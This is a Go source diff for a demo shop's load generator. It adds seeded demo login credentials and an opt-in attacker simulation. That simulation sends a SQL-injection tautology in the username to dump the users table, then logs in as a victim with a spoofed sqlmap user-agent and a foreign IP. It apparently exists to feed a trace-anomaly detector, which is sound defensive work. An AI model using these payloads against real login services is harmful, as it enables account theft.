@@ -10,6 +10,7 @@ import (
 	"math/rand"
 	"net/http"
 	"os"
+	"strconv"
 	"strings"
 	"time"
 )
@@ -48,6 +49,134 @@ func newHTTPClient(baseURL string) *http.Client {
 func kayakFaultEnabled() bool {
 	v := strings.ToLower(strings.TrimSpace(getEnv("KAYAK_FAULT_ENABLED", "false")))
 	return v == "true" || v == "1"
+}
+
+func attackEnabled() bool {
+	v := strings.ToLower(strings.TrimSpace(getEnv("ATTACK_ENABLED", "false")))
+	return v == "true" || v == "1"
+}
+
+// seededAccount is a real storefront credential (see mysql-init/init.sql). The
+// load generator uses these for BASELINE good logins — the normal traffic the
+// trace-anomaly detector learns before an attack stands out against it.
+type seededAccount struct {
+	Username string
+	Password string
+}
+
+var seededAccounts = []seededAccount{
+	{"alice", "Password123!"},
+	{"bob", "Hunter2Pass!"},
+	{"carol", "Tr@ilM1x99"},
+}
+
+// loginRequest / loginResponse mirror auth-service POST /auth/login.
+type loginRequest struct {
+	Username string `json:"username"`
+	Password string `json:"password"`
+}
+
+type loginResponse struct {
+	Token        string `json:"token"`
+	Warning      string `json:"warning"`
+	RowsReturned int    `json:"rowsReturned"`
+	Exfiltrated  []struct {
+		Username string `json:"username"`
+		Role     string `json:"role"`
+	} `json:"exfiltrated"`
+	User struct {
+		Username string `json:"username"`
+		Role     string `json:"role"`
+	} `json:"user"`
+}
+
+// postLogin sends POST /auth/login. extraHeaders lets the attacker spoof origin
+// context (X-Forwarded-For, User-Agent, X-OdiMall-Origin) that the gateway forwards.
+func postLogin(req loginRequest, extraHeaders map[string]string) (int, *loginResponse, error) {
+	body, _ := json.Marshal(req)
+	httpReq, err := http.NewRequest(http.MethodPost, gatewayURL+"/auth/login", bytes.NewReader(body))
+	if err != nil {
+		return 0, nil, err
+	}
+	httpReq.Header.Set("Content-Type", "application/json")
+	for k, v := range extraHeaders {
+		httpReq.Header.Set(k, v)
+	}
+	resp, err := client.Do(httpReq)
+	if err != nil {
+		return 0, nil, err
+	}
+	defer resp.Body.Close()
+	var out loginResponse
+	_ = json.NewDecoder(resp.Body).Decode(&out)
+	return resp.StatusCode, &out, nil
+}
+
+// authBaseline performs a legitimate login as a random seeded user from a normal
+// origin. This is the "known good" authentication traffic.
+func authBaseline() {
+	acct := seededAccounts[rand.Intn(len(seededAccounts))]
+	status, _, err := postLogin(
+		loginRequest{Username: acct.Username, Password: acct.Password},
+		map[string]string{"User-Agent": "OdiGear-Storefront/1.0"},
+	)
+	if err != nil {
+		log.Printf("[auth] baseline login %s failed: %v", acct.Username, err)
+		return
+	}
+	log.Printf("[auth] baseline login user=%s | HTTP %d", acct.Username, status)
+}
+
+// runAttacker runs the two-phase breach on its own cadence:
+//
+//	Phase 1 — credential theft: a SQL-injection payload in the username turns the
+//	          login lookup into a full dump of the users table (tautology). The
+//	          anomalous db.statement + row count on the `users` SELECT is the signal.
+//	Phase 2 — stolen-credential login: a VALID login for a real victim, but from an
+//	          anomalous origin (foreign IP + attacker-tool user-agent). The login
+//	          succeeds; the trace carries the anomalous context to flag.
+func runAttacker(every time.Duration) {
+	log.Printf("[attack] attacker simulation ENABLED — breach burst every %s", every)
+	ticker := time.NewTicker(every)
+	defer ticker.Stop()
+
+	// Anomalous origin markers forwarded by the gateway to auth-service.
+	anomalousHeaders := map[string]string{
+		"User-Agent":       "sqlmap/1.8#stable (http://sqlmap.org)",
+		"X-Forwarded-For":  "203.0.113.66", // TEST-NET-3 — stands in for an unfamiliar external IP
+		"X-OdiMall-Origin": "anomalous",
+	}
+
+	for {
+		<-ticker.C
+
+		// Phase 1: SQL-injection credential dump.
+		dumpPayload := loginRequest{Username: "' OR '1'='1", Password: "x"}
+		status, resp, err := postLogin(dumpPayload, anomalousHeaders)
+		if err != nil {
+			log.Printf("[attack] phase1 dump failed: %v", err)
+			continue
+		}
+		if resp != nil && resp.RowsReturned > 1 {
+			names := make([]string, 0, len(resp.Exfiltrated))
+			for _, e := range resp.Exfiltrated {
+				names = append(names, fmt.Sprintf("%s(%s)", e.Username, e.Role))
+			}
+			log.Printf("[attack] phase1 SQLi DUMP ok | HTTP %d | rows=%d exfiltrated=%v",
+				status, resp.RowsReturned, names)
+		} else {
+			log.Printf("[attack] phase1 dump returned HTTP %d (no multi-row leak — secureQueries on?)", status)
+		}
+
+		// Phase 2: stolen-credential login as the real victim (alice).
+		victim := loginRequest{Username: "alice", Password: "Password123!"}
+		status2, _, err := postLogin(victim, anomalousHeaders)
+		if err != nil {
+			log.Printf("[attack] phase2 stolen-credential login failed: %v", err)
+			continue
+		}
+		log.Printf("[attack] phase2 STOLEN-CREDENTIAL login user=alice from anomalous origin | HTTP %d", status2)
+	}
 }
 
 // rapidRiverKayakProductID is the Rapid River Kayak SKU (Kafka notification fault demo).
@@ -93,6 +222,14 @@ func getEnv(key, fallback string) string {
 		return v
 	}
 	return fallback
+}
+
+func parseInt(s string, fallback int) int {
+	n, err := strconv.Atoi(strings.TrimSpace(s))
+	if err != nil {
+		return fallback
+	}
+	return n
 }
 
 func parseDuration(s string) time.Duration {
@@ -154,10 +291,29 @@ type Product struct {
 	Category string  `json:"category"`
 }
 
-func productsForAutomatedOrders(all []Product) []Product {
+// excludedProductIDs parses EXCLUDE_PRODUCT_IDS (comma-separated, e.g. "3,5") — SKUs the load
+// generator never browses or buys. Use it to silence other problem patterns during a focused demo.
+func excludedProductIDs() map[int]bool {
+	out := map[int]bool{uiManualDemoProductID: true}
+	for _, raw := range strings.Split(getEnv("EXCLUDE_PRODUCT_IDS", ""), ",") {
+		raw = strings.TrimSpace(raw)
+		if raw == "" {
+			continue
+		}
+		id, err := strconv.Atoi(raw)
+		if err != nil {
+			log.Printf("Ignoring invalid EXCLUDE_PRODUCT_IDS entry %q", raw)
+			continue
+		}
+		out[id] = true
+	}
+	return out
+}
+
+func productsForAutomatedOrders(all []Product, excluded map[int]bool) []Product {
 	out := make([]Product, 0, len(all))
 	for _, p := range all {
-		if p.ID != uiManualDemoProductID {
+		if !excluded[p.ID] {
 			out = append(out, p)
 		}
 	}
@@ -338,11 +494,23 @@ func main() {
 	if err != nil {
 		log.Fatalf("Failed to fetch products: %v", err)
 	}
-	automatedCatalog := productsForAutomatedOrders(products)
+	excluded := excludedProductIDs()
+	automatedCatalog := productsForAutomatedOrders(products, excluded)
 	if len(automatedCatalog) == 0 {
-		log.Fatal("No products left for load generation after excluding UI-only demo SKU")
+		log.Fatal("No products left for load generation after exclusions")
 	}
-	log.Printf("Loaded %d products (%d eligible for automated checkout)", len(products), len(automatedCatalog))
+	excludedList := make([]int, 0, len(excluded))
+	for id := range excluded {
+		excludedList = append(excludedList, id)
+	}
+	log.Printf("Loaded %d products (%d eligible for automated checkout, excluded=%v)",
+		len(products), len(automatedCatalog), excludedList)
+
+	// Attacker simulation runs on its own cadence so normal traffic is unaffected.
+	if attackEnabled() {
+		attackEvery := time.Duration(parseInt(getEnv("ATTACK_INTERVAL_SECONDS", "30"), 30)) * time.Second
+		go runAttacker(attackEvery)
+	}
 
 	ticker := time.NewTicker(interval)
 	defer ticker.Stop()
@@ -350,6 +518,11 @@ func main() {
 	var orderSeq uint64
 
 	for {
+		// ~15% of ticks: a legitimate login (baseline "known good" auth traffic).
+		if rand.Float64() < 0.15 {
+			authBaseline()
+		}
+
 		// 70% chance: place an order, 30% chance: just browse
 		if rand.Float64() < 0.7 {
 			kayakOrder := false
